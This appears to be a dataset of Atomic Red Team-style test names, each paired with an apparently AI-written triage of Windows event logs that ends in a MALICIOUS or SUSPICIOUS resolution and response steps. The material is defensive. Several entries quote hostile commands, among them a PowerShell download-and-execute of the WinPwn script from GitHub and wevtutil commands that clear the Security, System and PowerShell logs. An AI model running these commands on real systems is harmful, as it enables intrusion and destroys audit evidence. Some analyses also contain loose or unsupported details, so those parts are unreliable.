1. **Log Clearing Events:**
    - Multiple instances of the `wevtutil.exe` utility being used to clear event logs (`EventID: 1102` in Security logs and `104` in System logs). Specifically, the commands were executed to clear the Application, System, and Security logs. Clearing logs, especially without an apparent legitimate reason, is often an indicator of malicious activity intended to cover tracks.

2. **High Privilege Assignments:**
    - The user `admin_test` was granted multiple high-privileged roles (`EventID: 4672`), such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. These privileges allow reading and modifying any user’s files and the ability to debug processes, which can be dangerous in the hands of a malicious actor.

3. **Unusual PowerShell Execution:**
    - The PowerShell script executed `get-localgroup` and `Get-LocalGroupMember` to enumerate the Administrators group. This could be part of a reconnaissance activity by an attacker to understand the current permissions setup on the system.

4. **Process Execution by `admin_test`:**
    - `admin_test` executes several system utilities like `wevtutil.exe` (for log clearing), `hostname.exe`, `whoami.exe` (likely for user information gathering), and PowerShell with elevated privileges. The combination and sequence of these commands suggest potential lateral movement or reconnaissance behavior.

### Non-Suspicious Activities

Security Software Discovery - powershell,"Upon analyzing the provided Windows event logs, several indicators of potentially suspicious behavior stand out, particularly surrounding the use of PowerShell commands and the clearing of event logs. Here's a detailed breakdown of the suspicious activities observed:

### Suspicious and Anomalous Behaviors:

1. **PowerShell Script Execution (Indicators of Anti-Forensics or Host Reconnaissance):**
   - The PowerShell log indicates the execution of a script that queries processes related to well-known security and anti-virus products, including descriptions or process names containing ""virus"", ""carbonblack"", ""defender"", ""cylance"", ""mc"" (potentially McAfee), and ""Sysmon"". This behavior suggests a reconnaissance activity to identify if these security monitoring tools are running on the system. This might be used by an attacker to determine which defenses are active before conducting further malicious actions.

2. **Event Log Clearing:**
   - Multiple logs across System, Security, and Windows PowerShell channels have been cleared. The `wevtutil` utility was run multiple times for this purpose, which is typically associated with an attempt to erase traces of potentially malicious activity, indicating an attempt to cover tracks.

3. **Time Manipulation:**
   - There are records indicating a time change operation on the system. Time changes can be used to disrupt the logging accurately or to match timestamps with known events, potentially aiding in evasion tactics.

4. **High Integrity Level Execution:**
   - The processes run by the user `SERVER002\admin_test` involve suspiciously high privilege levels, managing clearing logs and executing PowerShell scripts, which can indicate an attempt of privilege escalation or use of an already compromised high-privilege account.

### Indicators of Compromise:

Given the combination of PowerShell script execution intending to survey for security tools and subsequent log-clearing activities, these actions suggest a high likelihood of malicious activity. The use of `wevtutil` to clear logs particularly amplifies this concern as it is a known method for attackers to cover their tracks.

### Assessment:

Based on the activities observed:
- **Resolution: MALICIOUS**

The observed behavior strongly indicates malicious intent, with a clear attempt to understand the system's defensive mechanisms through reconnaissance and to conceal any potential nefarious activity by clearing logs.

### Guidance on How to Proceed:

1. **Immediate Containment:**
   - Isolate the affected machine (Server002) from the network to prevent any further potential spread or exfiltration of data.
   
2. **Forensic Investigation:**
   - Conduct a full forensic analysis of the machine to identify any secondary payloads or backdoors installed, using a trusted boot environment to avoid further tampering by potential malware.
   
3. **Credential Management:**
   - Since `admin_test` appears compromised, initiate a password change for this account and evaluate other accounts potentially compromised during this incident. Implement strong multi-factor authentication where possible.

4. **System Restoration and Recovery:**
   - Restore the system from a known good backup prior to the first detection of suspicious activity and ensure this backup is free from any compromise.

5. **Awareness and Monitoring:**
   - Increase monitoring for similar activities across the network and enhance logging configurations to retain logs against tampering or unauthorized clearance. Additionally, train staff on recognizing signs of compromised systems and educate them on reporting suspicious behaviors swiftly.

The combination of these steps should help mitigate the immediate threat, strengthen defenses, and prevent similar future incidents."
List Google Chrome - Edge Chromium Bookmarks on Windows with command prompt,"Upon a thorough review of the provided logs, several activities stand out and warrant further discussion:

1. **Event Log Clearing:**
   - The logs show multiple clear operations on various Windows event logs, specifically the System and Security logs by the user `admin_test` using `wevtutil.exe`. This is a significant red flag as clearing event logs without legitimate reason can be an attempt to cover tracks of nefarious activities.

2. **Command Line Executions:**
   - There are suspicious command line executions, such as the use of `cmd.exe` to execute `where /R C:\Users\ Bookmarks`. This command might be looking to locate file names containing ""Bookmarks"", which could indicate information gathering, possibly targeting browser profiles or user data.
   
3. **High-Integrity Level Executions:**
   - Processes launched with high integrity level, including the `wevtutil.exe` commands, indicate that they were executed with administrative privileges. The focus on event logs and the use of known system utilities to manipulate them suggest a deliberate action rather than routine administrative activity.

4. **Frequent Use of `wevtutil.exe`:**
   - The repeated use of `wevtutil.exe` to clear logs across different channels, including `Microsoft-Windows-Sysmon/Operational` and `Security`, especially by an admin account, isn’t standard for typical system management tasks and often correlates with attempts to obstruct forensic analysis.

5. **Use of `hostname.exe` and `whoami.exe`:**
   - Both utilities were executed, which could be used to gather information about the machine and current user context. In isolation, this might be typical; however, paired with the above observations, it could be part of reconnaissance activity.

6. **Edge Updates and Executions:**
   - While there is significant activity surrounding Microsoft Edge updates, including processes running as `NT AUTHORITY\SYSTEM`, this seems to align with typical system update behavior. Nevertheless, the presence of updates and similar activities around the time of log clearance adds complexity to the timeline of events.

### Assessment
The behavior observed in these logs includes indications of potentially malicious activity:
- The event log clearing by an admin user is especially concerning.
- Several command executions and checks hint at possible reconnaissance or preliminary steps before executing a broader attack.

### Resolution
**SUSPICIOUS**

### Guidance on How to Proceed
- Conduct a deeper investigation to determine the intent and scope of these activities.
- Review and verify the actions and alibi of the user `admin_test`.
- Check network logs and other available monitoring solutions for any correlated anomalous activity.
- Inspect system configurations and apply additional monitoring on critical systems.

WinPwn - Powersploits privesc checks,"Upon reviewing the provided logs, there are multiple indicators of potentially malicious activity that need to be addressed in a structured manner.

### Analysis of Suspicious or Anomalous Behavior:

1. **Event Log Clearing:**
   - Multiple log clearing events are noted:
     - System logs were cleared by the user `admin_test`, as indicated by events with ID 104.
     - Security logs were also cleared (Event ID 1102), which is an uncommon and suspicious action if not documented as part of routine maintenance.

2. **PowerShell Execution:**
   - A suspicious PowerShell command was executed that originated processes with event IDs indicating downloading and executing a remote script:
     - The command downloads and executes a script from a GitHub repository (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn`). This is highly suspicious since legitimate scripts rarely need to pull from external, publicly hosted repositories directly.
     - The nature of `WinPwn.ps1` warrants investigation to determine its function, as it may partake in actions such as system assessment, vulnerability scanning, or unauthorized access.

3. **Use of `wevtutil` Executable:**
   - The tool `wevtutil.exe` was used multiple times closely before the logs were cleared. This is a known utility for exporting, archiving, and clearing event logs, suggesting intent to cover actions or prevent log analysis.

4. **Unusual Process Execution:**
   - Processes such as `whoami.exe` and `HOSTNAME.EXE` were executed in a similar timeframe. These can indicate enumeration activities that are often part of initial access or reconnaissance phases in cyber attacks.

5. **High Integrity Level Processes:**
   - The processes initiated by `admin_test` are executing at a high integrity level, showing that the user had significant privileges on the system. This amplifies the potential impact of any malicious intent.

### Conclusion:
The cumulative evidence suggests potentially malicious activities aimed at covering tracks after executing a remote script that could facilitate unauthorized actions or reconnaissance on the system.

WinPwn - itm4nprivesc,"After analyzing the provided Windows event logs from the system, security, application, Sysmon, and PowerShell logs, here are the key findings related to potentially suspicious or malicious activity:

1. **Suspicious Log Clearing Activity**:
   - Multiple instances of event logs being cleared are present, notably executed by the `wevtutil.exe` tool by the user `admin_test`. Logs were cleared for channels including System, Windows PowerShell, Security, and the Microsoft-Windows-Sysmon/Operational. Clearing logs can be a method to cover tracks after malicious activities, suggesting an attempt to hide actions.

2. **Malicious PowerShell Activity**:
   - A PowerShell script was executed from a URL using `iex` and `New-Object Net.WebClient`. This script was downloaded from `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`. The use of `iex` to execute contents downloaded from an external source is a strong indicator of potentially malicious activity, typical of attacks involving script-based payloads or system reconnaissance tools.
   - The command included a component `itm4nprivesc` suggesting a possible Privilege Escalation technique being employed.

3. **General Anomalous Behavior**:
   - The logs display a sequence of running system utilities like `hostname.exe`, `whoami.exe`, alongside the execution of `PowerShell.exe`, known tools that can be used for system reconnaissance when executed in a certain sequence and context.

4. **High-Integrity Processes**:
   - The processes executed by `admin_test` have high integrity levels, indicating the user had elevated or administrative privileges, which is concerning as it may bypass standard security measures.

Given the evidence of suspicious behavior (log clearing) combined with a confirmed malicious script execution via PowerShell that was likely intended to perform privilege escalation or reconnaissance, this activity is indicative of a compromise or attempted compromise of the system.

**Resolution: MALICIOUS**

Qakbot Recon,"Based on the provided logs, there are several points that suggest potential suspicious or even malicious behavior:

1. **Log Clearing Activity (Event ID 1102 in Security logs and Event ID 104 in System logs):** 
   - We observe multiple events indicating the clearing of logs (`wevtutil.exe cl` usage), which is typically done by malicious actors to cover their tracks. For instance, `admin_test` clears logs for multiple channels including ""Security"", ""Application"", and ""System"" using the `wevtutil` command. This is suspicious activity as it generally precedes other malicious or unauthorized activities.

2. **Execution of Scripts and Commands:**
   - The log entries show the execution of commands like `ipconfig`, `arp`, `nslookup`, `whoami`, `cmd.exe`, and batch scripts such as `qakbot.bat`. While these can be legitimate commands, their execution from temporary directories (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\`) coupled with log clearing suggest adversary activity. The `AtomicRedTeam\\T1016\\src\\qakbot.bat` indicates likely use of a penetration testing framework or adversary simulation tool, potentially by malicious actors.

3. **Privilege Escalation & High Integrity Level:**
   - The user `admin_test` frequently gains elevated privileges (Event ID 4672) with sensitive permissions like `SeDebugPrivilege`, which are commonly used for privilege escalation.

4. **Failed Logon Events (Event ID 5379):**
   - Repeated failed logon attempts indicating attempts to access particular accounts without success. Although this alone doesn't confirm malicious intent, when correlated with other activities, it suggests potential reconnaissance or brute force attempts.

5. **Parent-Child Process Relationships:**
   - The parent process for many suspicious commands is `wsmprovhost.exe`, using `-Embedding`, which is uncommon in regular activity and is often seen in lateral movement or execution via PowerShell remoting sessions.

6. **Anomalous Network Activity:**
   - The execution of tools like `netstat`, `route`, and network-viewing commands suggests active network reconnaissance that aligns with potential lateral movement attempts.

Given these observations and the combination of factors such as log clearing, script execution, privilege escalation, and network reconnaissance, the activity within these logs points towards a high likelihood of malicious activity. Therefore, the resolution for these findings is:

**Resolution: MALICIOUS**

**Guidance:**
- Immediate containment is advised for the host in question to prevent further unauthorized actions.
- Conduct a thorough investigation to identify and isolate other compromised assets within the network.
- Review user access logs and validate the legitimacy of user accounts involved in suspicious activities.
- Implement enhanced monitoring and alerting for similar activities across other systems.
- Consider conducting an incident response to analyze the root cause, extent of compromise, and remediate any vulnerabilities exploited."
Automated AD Recon (ADRecon),"The provided logs display a sequence of events occurring on a Windows host, specifically on a machine named ""Server002"". Upon analyzing these logs, there are several indicators of potentially malicious activity:

1. **Log Clearing Events**: Events with IDs 104 in the system log and ID 1102 in the security log indicate that the logs were cleared by a user named ""admin_test"". Log clearing is a common behavior seen in the efforts to cover up malicious activities as attackers attempt to remove their traces.

2. **PowerShell Execution**: The execution of PowerShell with command such as `Invoke-Expression` associated with `ADRecon.ps1` in the Windows PowerShell logs is a clear indicator of potentially malicious activity. ADRecon is a known tool often used for Active Directory reconnaissance by attackers to gather information.

3. **Process Execution and Logon**: Several instances of processes like `wevtutil.exe` (used to manipulate event logs) executed by user ""admin_test"" with commands to clear specific logs indicate malicious intent. This is confirmed by frequent executions of `wevtutil.exe` with different command-line arguments to clear different event logs.

4. **Elevated Privileges**: There are multiple instances of security events where privileges associated with powerful system actions are seen in the logs. Event ID 4672 shows privileges for the SYSTEM account, which could be a sign of malicious privilege escalation attempts.

5. **Anomalous Process Activity**: The execution sequences involving `wevtutil`, `host name`, `whoami`, and PowerShell coupled with clearing of event logs point towards potentially malicious user or script activity attempting to gather information or modify system configurations and then covering their tracks.

6. **Multiple Suspicious Processes**: There are processes like `wevtutil` clearing logs, `rundll32.exe` with commands directing to specific DLL files, and additional executions of command-line processes like `whoami.exe`, which could hint at reconnaissance or system probing activities.

Based on these findings of log clearing, suspicious PowerShell activity aimed at reconnaissance, and the use of `wevtutil` to manipulate event logs, all indicators suggest consistent behaviors associated with malicious activities.

### Resolution: MALICIOUS

**Guidance on How to Proceed:**
- **Immediate Isolation**: Isolate the affected host (Server002) from the network to prevent further potential spread or communication with any external malicious entities.

WinPwn - winPEAS,"Based on the Windows event logs provided, several events raise significant concerns about potential malicious activity on the system.

### Suspicious Activities Identified:

1. **PowerShell Activity**:
   - The logs show multiple instances where a PowerShell script from the external source ""https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/..."" is being downloaded and executed. This script is executed using the `iex(new-object net.webclient).downloadstring(...)` method, which is commonly used in malicious activities to bypass security restrictions and execute code directly from the internet. Additionally, `winPEAS -noninteractive -consoleoutput` indicates the usage of a popular enumeration tool often used for privilege escalation and information gathering.

2. **Clearing of Event Logs**:
   - The System, PowerShell, and Security event logs were cleared almost simultaneously by the user `admin_test`. This is highly suspicious as clearing logs is a known tactic used by attackers to cover their tracks after compromising a system.

3. **Unusual Process Execution**:
   - Execution of `wevtutil.exe` process with `cl` (clear) command for various event logs (System, Security, and Windows PowerShell) indicates intentional attempts to tamper with or erase logs.
   - The processes `PowerShell.exe` and `conhost.exe` are spawning frequently in close timestamps, typical of script execution that might try to interact with the command line environment.

4. **Kernel and Time Service Events**:
   - Time was adjusted on the system, which could potentially be an indicator of security logs tampering. However, it might also be benign if explained as part of the system's legitimate timekeeping functions.

### Threat Assessment:

- The downloading and execution of scripts from an untrusted, external source via PowerShell, along with the subsequent use of system enumeration tools (such as `winPEAS`), is a strong indicator of malicious intent, aimed at gathering information and potentially escalating privileges on the system.
- Clearing the system’s event logs is an action that is consistent with attempts to cover up unauthorized activities, further supporting the hypothesis of malicious behavior.

### Resolution:

**MALICIOUS** - The activity in the logs, particularly the execution of external scripts via PowerShell and the clearing of critical logs, strongly indicates a malicious compromise of the system.

### Guidance on How to Proceed:

1. **Immediate Isolation**:
   - Isolate the affected host to prevent further spread or execution of potentially malicious activities.

2. **Comprehensive Forensic Analysis**:
   - Perform a full forensic analysis to understand the scope and impact of the compromise.
   - Investigate any potential unauthorized access to sensitive data.

   - Review activities associated with the user `admin_test` and reset credentials as a precaution.

4. **Remediation**:
   - Remove identified malicious scripts and executables from the system.
   - Rebuild or restore the system from a known good backup if necessary.

5. **Enhance Monitoring and Security Posture**:
   - Enhance logging and monitoring to detect similar incidents in the future.
   - Consider deploying additional security controls like application whitelisting or endpoint detection and response (EDR) systems to prevent unauthorized script downloads and execution.

By taking these steps, the organization can mitigate the risk and prevent future compromises."
System Service Discovery - net.exe,"## Detailed Analysis of the Logs:

### Suspicious and Anomalous Behaviors:

1. **Log Clearing Operations**:
   - Multiple instances of the `wevtutil.exe cl` command were used to clear the `Microsoft-Windows-Sysmon/Operational`, `Application`, `Security`, `System`, and `Windows PowerShell` event logs. This activity is highly suspicious as it indicates an attempt to hide traces of activities on the system.
   - The process was executed by the user `SERVER002\admin_test` and is recorded with a high integrity level, suggesting administrative privileges.

2. **High-Privilege Activity**:
   - The events show `admin_test` gaining multiple privileges (`SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, etc.`) shortly before the logs were cleared. This suggests a deliberate preparation for executing potentially malicious activities with escalated privileges.
   
3. **Unusual Network Connections**:
   - The `4624` (Logon) event with NTLM authentication from a remote workstation `DESKTOP-3HL5B2P` using an IPv6 address seems potentially malicious if this workstation does not usually access the server using this protocol or method.

4. **Execution of Commands**:
   - `cmd.exe` was executed with a command to list services and save the output to a temporary file. While not inherently malicious, in context with the log clearance and privilege escalation, this activity indicates reconnaissance.
   - Use of `whoami.exe` and `hostname.exe` commands can be part of a script designed to enumerate user and system information.

5. **Multiple Credential Read Failures**:
   - Event ID `5379` showing failures to obtain credentials from `MicrosoftAccount` and `WindowsLive` sources could indicate attempts at unauthorized access attempts. 

### Indicators of Malicious Activity or Compromise:

- **The combination of privilege escalation, log clearing, and reconnaissance activities (service enumeration, user identity checks)** creates a picture of a potential security breach. Together, these events suggest an attempt to cover tracks following unauthorized system modifications or data access.
- **Events initiated by the user `admin_test`, especially clearing logs using elevated privileges, strongly suggest intentional actions to conceal activity on the server.**

## Assessment:

Based on the evidence from the logs, the activity appears coordinated and deliberate, pointing to an unauthorized attempt to manipulate or access sensitive system resources while covering tracks. Given the privileges exercised and logs cleared, it is indicative of a **compromise**.

## Guidance:

1. **Immediate Investigation**:
   - Conduct a thorough investigation of the `admin_test` account to determine if this is a legitimate user or a compromised account.
   - Check for any unauthorized changes or access to sensitive data made by this account during the time of the logs.

2. **Enhanced Monitoring**:
   - Set up more rigorous monitoring and alert systems to detect unusual activities, such as privileged command execution or privileged logons especially from remote workstations.

3. **Access Control Review**:
   - Verify and possibly restrict the privileges associated with accounts like `admin_test`. Ensure accounts with similar privileges are thoroughly reviewed.

4. **Incident Response**:
   - Based on the findings, consider activating your incident response plan to manage and contain any potential breaches.

## Resolution:

**MALICIOUS** - The logs contain activity that indicates a malicious attempt to cover tracks and access system resources with elevated privileges. Immediate response and investigation are warranted."
Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting),"**Analysis of Windows Event Logs:**

After a thorough examination of the provided logs, several indicators of suspicious activity were identified:

1. **Event Log Cleared (Event ID 1102 and 104)**:
   - There are events showing that the security, system, and Windows PowerShell logs have been cleared. Cleared log files are often indicative of an attempt to cover tracks after unauthorized actions. The user `admin_test` was responsible for this action, which is an early indicator of potential malicious activity, especially on a sensitive machine like the CEO’s.

2. **Execution of Suspicious Commands**:
   - Multiple instances of the command-line application `wevtutil.exe` (Windows Event Log utility) are recorded. Its execution is typically associated with clearing logs (as seen by the command `wevtutil.exe cl`) and should be scrutinized, especially if not part of regular maintenance or administrative use.
   
3. **Use of PowerShell with Ambiguous Commands**:
   - PowerShell logs indicate the execution of a suspicious command that seems to query for specific Active Directory users marked as sensitive (possibly enabled accounts with special attributes). The command itself isn’t inherently malicious, but given its context within this log trail, it raises a flag.

4. **Credential and Privilege Enumeration (Event ID 4798 and 4672)**:
   - Credential enumeration events and a series of events elevated with multiple privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, and `SeRestorePrivilege` suggest that an attempt might have been made to perform actions requiring higher privileges than what might be standard for routine job functions.

5. **Pattern of Repeated Credential Access Failures (Event ID 5379)**:
   - Numerous failed Microsoft account credential access attempts were logged, pointing towards possible brute-force attacks or unauthorized access attempts.

6. **Secondary Processes and Host Manipulations**:
   - The frequent use of `conhost.exe` along with `taskhostw.exe` and `wsmprovhost.exe` might be typical in some administrative tasks but seems unusually high and interconnected with log file clearances and privilege escalations.
   
**Assessment:**

The series of events and their proximity once consolidated form a narrative of potentially malicious activity. The combination of unauthorized log clearances, privilege escalations, and repeated unauthorized access attempts fulfil the criteria of a malicious intrusion pattern rather than benign administrative oversight or normal user error.

**Resolution:** **MALICIOUS**

**Guidance on How to Proceed:**

1. **Forensic Analysis**: Immediately take an image of the affected host and preserve any remaining volatile data. A deeper forensic investigation should be conducted to confirm the extent of the compromise and any exfiltration or lateral movement.

2. **User and Access Review**: Review `admin_test` user activities and access privileges. Consider temporarily disabling accounts identified in suspicious activities until a clearance is given post-investigation.

3. **Network Monitoring**: Closely monitor network traffic for any signs of external communications that could suggest data exfiltration or ongoing attacker activity.

4. **Log and SIEM Review**: Investigate SIEM tools for any correlated alerts or logs that could give further context and understand the scope beyond the initial alert.

5. **Security Policies and Procedures**: Review and possibly strengthen security policies, especially log management and administrative access protocols.

6. **Patch and Scan**: Ensure all systems are fully patched and run a comprehensive scan for any known vulnerabilities or indicators of compromise across the infrastructure.

Taking these steps can help contain, mitigate, and understand the breach, and provide insights or updates needed to adjust the ongoing security strategy."
Device Driver Discovery,"### Analysis of the Logs

Upon reviewing the provided logs, several activities appear suspicious and potentially indicative of malicious activity:

1. **Event Log Clearing**: 
   - **Sysmon Logs**: There's frequent execution of `wevtutil.exe` with the `cl` (clear) option against different event logs (Application, System, and Windows PowerShell). This tool is often used to clear Windows event logs, which is a strong indicator of attempts to cover malicious traces (Event IDs: 17953, 17957, 17961, 17965).
   - **Security and System Logs**: Events indicating that the logs have been cleared by `admin_test` (Security Event ID: 1102, System Event ID: 104).

2. **Privilege Escalation and High Integrity**:
   - **Security Logs**: Multiple instances of privilege escalation are captured (Event ID: 4672), where `admin_test` is granted several high-level privileges such as `SeDebugPrivilege`, which can be used for malicious intent.
   - The processes executed by the user `admin_test` are often at a High Integrity Level, indicative of administrative permissions being used.

3. **Use of `wevtutil.exe` and `conhost.exe`**:
   - `wevtutil.exe` is used frequently and in a pattern that suggests trying to clear logs (`cl`) across multiple types (Application, System, Windows PowerShell). 
   - `conhost.exe` being spawned in conjunction with `wevtutil.exe` processes, while not inherently malicious, raises suspicion when combined with the log clearing activity.

4. **Unexpected Process Executions**:
   - Execution of `whoami.exe` and `hostname.exe` without apparent legitimate justification, possibly for reconnaissance.
   - Unusual use of `powershell.exe` to run `driverquery`, which can be used in living-off-the-land attacks (LOLBins). The command contained chained commands (`driverquery /v /fo list, driverquery /si /fo list`) executed via PowerShell raises a red flag when combined with other suspicious activities.

5. **Time Manipulation**:
   - The event log indicates a `time-change` action (System Event ID: 1), which often can be used as part of anti-forensics to manipulate time-based event logs.

### Assessment and Resolution

**Assessment**:
- There is clear evidence of potential malicious activity within the logs:
  - Multiple logs being cleared suggest an attempt to destroy evidence.
  - Privilege escalation activities point towards an operation requiring elevated permissions.
  - The combined use of various system binaries (`wevtutil.exe`, `whoami.exe`, and `powershell.exe`) with a pattern that matches TTPs (Tactics, Techniques, and Procedures) for common adversaries.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**

1. **Isolate the Host**: Immediately isolate the affected host (`Server002`) from the network to prevent lateral movement and further impact.
   
2. **Conduct a Thorough Forensic Investigation**:
   - Analyze the data present on the server before data was potentially cleared.
   - Recover cleared logs if possible using forensic recovery techniques.
   - Look for additional signs of persistence and data exfiltration.
   
3. **User Account Audit**:
   - Review any unusual activity associated with the `admin_test` account and any other accounts showing similar suspicious activities.
   - Consider resetting credentials and evaluating existing permissions.

4. **Deploy Enhanced Monitoring**:
   - Implement IDS/IPS rules specific to behaviors seen in the logs.
   - Enhance logging to capture further suspicious activity.

5. **Review Security Posture**:
   - Harden the affected systems and review policies to prevent similar incidents.
   - Potentially run a compromise assessment for other machines in proximity. 

6. **Communicate with Stakeholders**: Notify appropriate stakeholders, including cybersecurity, IT, management, and possibly legal and compliance teams, depending on the severity and scope of the incident.

These actions and careful steps will help mitigate immediate risk and guide recovery and remediation efforts after this incident."
WinPwn - MS17-10,"Upon examining the provided event logs from different sources, several points of concern indicate potential malicious activity on the host computer (Server002). Here’s a detailed analysis:

### Summary and Findings:
1. **Log Clearance Activities:**
   - Multiple logs within the `System`, `Windows PowerShell`, and `Security` channels were cleared by the user `admin_test` using `wevtutil.exe`, raising suspicion. Event log clearance is commonly associated with attempts to cover tracks after malicious activity.

2. **Suspicious PowerShell Execution:**
   - In the `Windows PowerShell` logs, there is a suspicious execution of PowerShell using a scrapped script from the GitHub repository `S3cur3Th1sSh1t`, specifically the script `WinPwn.ps1`, which is intended for exploitation (MS17-10 vulnerability). This command-line behavior is typically associated with malware deployment or exploitation attempts.

3. **Unusual Processes and Privileged Actions:**
   - Sysmon log entries show the initiation of `hostname.exe` and `whoami.exe`, typically employed in scripts to interrogate system information about the host environment.
   - There was execution leading to a process that started `wevtutil.exe` multiple times, each indicating event log clearance activity. `wevtutil.exe` is a utility to manage Windows event logs and its usage in this context (with cleared logs) suggests an attempt to delete evidence of malicious activities.

4. **Time Manipulation Events:**
   - Logs suggest time synchronization and timezone changes, possibly indicating activity to confuse or mislead event log timestamps as a method to obscure timing of actions.

5. **High Privileges Usage:**
   - The `Security` log recorded usage of several high privilege tokens by the user `admin_test`, including `SeDebugPrivilege`—which allows threads to debug other processes—a privilege often misused in advanced attacks.

### Assessment of Situation:
Based on the event logs, there is a strong indication of malicious activities involved with clear attempts to execute a known exploit code, log clearance attempts, and potential privilege escalation. The presence of known exploit scripts being directly downloaded and executed, compounded with the clearing of surrounding logs, strongly suggests an attack in progress or compromise has occurred.

### Identified Threats and Risks:
- **Potential Data Breach:** If the exploit scripts provided unauthorized access, sensitive company data could be at risk.
- **Presence of Backdoors or Additional Exploits:** The exploit may leave behind backdoors for future access, apart from the exploit already attempted/executed.
- **System Integrity Compromise:** Clearing of logs points toward an active attempt to shield malicious activities, compromising system integrity and audit trails.

### Recommended Actions:
1. **Immediate Isolation:** Disconnect the affected machine, `Server002`, from the network to prevent further spread or data extraction.
2. **Thorough Investigation:** Conduct a post-incident analysis with a deep forensic investigation to understand the full scope and identify any potential backdoors or installed malware.
3. **Security Patching:** Ensure all systems, particularly `Server002`, receive all security patches and updates, especially for vulnerabilities like MS17-10.
4. **Audit and Fortify Logs:** Enhance logging policies and consider implementing additional log integrity systems, such as [WORM (Write Once Read Many)] storage for critical logs.
5. **Review and Update Security Policies:** Re-evaluate user privilege levels, particularly for high-privileged accounts like `admin_test`, and reinforce multi-factor authentication.

### Conclusion:
Given the behavior and events observed, the resolution for these event logs would be **MALICIOUS** since there are clear indicators of exploitation and activity concealment by potentially unauthorized or malicious actors. Immediate action is necessary to mitigate risks and safeguard against potential security breaches."
Port Scan NMap for Windows,"In the provided event logs for the Windows host, there are several suspicious activities that could indicate malicious behavior. Below are the key findings from the logs:

1. **Log File Clearing**:
   - **System Log Event ID 104**: Logs have been cleared across System, Security, and Windows PowerShell channels by the user ""admin_test."" This action is often associated with attempts to cover tracks after malicious activities.

2. **Suspicious PowerShell Usage**:
   - **PowerShell Log Event ID 600**: PowerShell executed with a command that includes `nmap 127.0.0.1`. Nmap is a network scanning tool often used for reconnaissance activities by attackers.

3. **Installation of Potentially Malicious Software**:
   - **Sysmon Log**: There are multiple instances of processes related to the installation of Nmap (nmap-7.80-setup.exe) and Npcap drivers, which could be used to sniff network traffic. The automatic and quiet installation (`/S`) without user interaction heightens the suspicion.
   - The installation of Visual C++ redistributables (likely a part of some packaged software) appears legitimate but coincides with other suspicious activities.

4. **Use of System Utilities**:
   - The use of tools like `certutil.exe` to add certificates (`certutil -addstore`) is suspicious, as attackers often use it to bypass network protections or establish persistence.
   - Scheduled tasks creation with `schtasks.exe` is observed (`SCHTASKS.EXE /Create /F /RU SYSTEM /SC ONSTART`). This could be used to maintain persistence across reboots.

5. **Indicators of Persistence Mechanisms**:
   - Creation of a scheduled task named ""npcapwatchdog"" which points to potential malware persistence on system start.
   - Running of registry editing commands (`regedt32.exe`) to manipulate system settings, which might be exploited for malicious purposes.

6. **Use of Administrative Tools and Privilege Escalation**:
   - Frequent invocation of administrative and system tools, like `wevtutil.exe` to clear event logs, `netsh.exe` for network commands, and `conhost.exe` facilitating command executions, indicates abuse of system utilities.

7. **Network and Privilege Escalation Actions**:
   - Use of `executables` and system-level processes (`dllhost.exe`, `svchost.exe`) under high integrity and NT AUTHORITY\SYSTEM points to potential unauthorized elevation attempts.

Given the combination of these suspicious entries and activities, the logs show clear signs that the system might be compromised. The act of log clearing, coupled with the use of reconnaissance and potential data exfiltration tools, suggests a systematic attempt to exploit and potentially control the system.

**Assessment: MALICIOUS**

**Recommendations**:
- Isolate the affected system immediately to prevent further compromise or lateral movement in the network.
- Conduct a thorough forensic investigation to understand the extent of the breach and uncover any potential backdoors or persistence mechanisms set by the attacker.
- Review system policies and enhance logging and monitoring to detect and prevent such activities in the future.
- Consider a full system rebuild if necessary, to ensure that all possible traces of compromise are eradicated.
- Change credentials, especially those for admin accounts, and review authentication policies across the organization."

View available share drives,"Upon reviewing the provided event logs, there are some activities that stand out and need closer inspection:

1. **Event Log Clearing**: 
   - The logs indicate multiple instances where Windows event logs, especially Security, System, and PowerShell channels, have been cleared by the user `admin_test` using the `wevtutil.exe` command-line utility. This is shown in the Security and Sysmon logs indicating the intentional clearing of logs (Sysmon EventID 1) at `12:27:12` UTC and associated `wevtutil` comannd executions, specifically:
     - `""C:\\Windows\\system32\\wevtutil.exe\"" cl Security""`
     - `""C:\\Windows\\system32\\wevtutil.exe\"" cl System""`
     - `""C:\\Windows\\system32\\wevtutil.exe\"" cl \""Windows PowerShell\""""`
   - Log clearing can be a significant indicator of malicious activity, as it is often used to cover tracks and remove evidence of unauthorized or malicious operations.

2. **Command Execution**: 
   - There is a command execution using `cmd.exe` with the argument `/c net share`, suggesting enumeration or modification of network shares. The use of the `net share` command further confirms possible reconnaissance or persistence attempts on connected devices:
     - Executed at `12:27:14.3331504` with ProcessId `1852` as seen in Sysmon logs.

3. **Time Change Events**:
   - There are two time change events with the `svchost.exe` process at `12:27:29`. These adjustments can sometimes be an indication of efforts to disrupt log timelines, but in this context, they seem to correspond with a system update (Windows Defender update noted in System logs).
   
4. **Microsoft Edge Updates**: 
   - Series of EdgeUpdate activities as described in Sysmon logs, which appear normal given their association with Microsoft update processes. The parent and child process relations and the integrity level (System) maintain consistency with expected behavior during software updates.

**Assessment**:
- The clearing of event logs via `wevtutil.exe` by an administrative user who appears to be directly involved in these actions is highly suspicious. This behavior is often associated with malicious intent, as it aims to hide evidence of actions on the system.
- The `cmd.exe` execution related to `net share` commands enhances this suspicion, indicating possible unauthorized reconnaissance or infiltration steps.

**Resolution**:
- **MALICIOUS**: The use of administrative privileges to clear multiple event logs using `wevtutil.exe` combined with network share command execution without a clear business reason highly suggests malicious activity directed at concealing traces and possibly conducting unauthorized operations.

**Guidance on How to Proceed**:
1. **Immediate Containment**: Isolate the affected host (Server002) from the network to prevent further potential damage or exfiltration.
2. **Root Cause Analysis**: Conduct a thorough forensic investigation to determine how the attacker gained access, including examining any malicious activity and IOC (Indicator of Compromise) artifacts.

Enumerate Remote Hosts with Netscan,"### Detailed Analysis

Upon reviewing the provided logs, several key events indicate suspicious behavior potentially indicative of malicious activity:

1. **Security Logs:**
